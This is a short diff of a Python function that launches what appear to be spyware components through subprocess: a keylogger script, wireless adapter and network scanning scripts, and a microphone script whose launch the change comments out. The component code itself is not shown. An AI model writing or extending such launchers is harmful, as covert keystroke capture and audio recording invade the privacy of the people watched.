@@ -42,7 +42,8 @@ def Call_function():
                                                                     # keyboard interrupt
     subprocess.Popen('python material\\Keylogger.py', shell=True)
                                                                     # mic interrupt
-    subprocess.Popen('python material\\mic.py', shell=True)
+    #more interrupt
+    #subprocess.Popen('python material\\mic.py', shell=True)
                                                                     # scapy scan and find adapter wireless
     subprocess.Popen('python material\\getadapter.py', shell=True)
     subprocess.Popen('python material\\networkscan.py', shell=True)
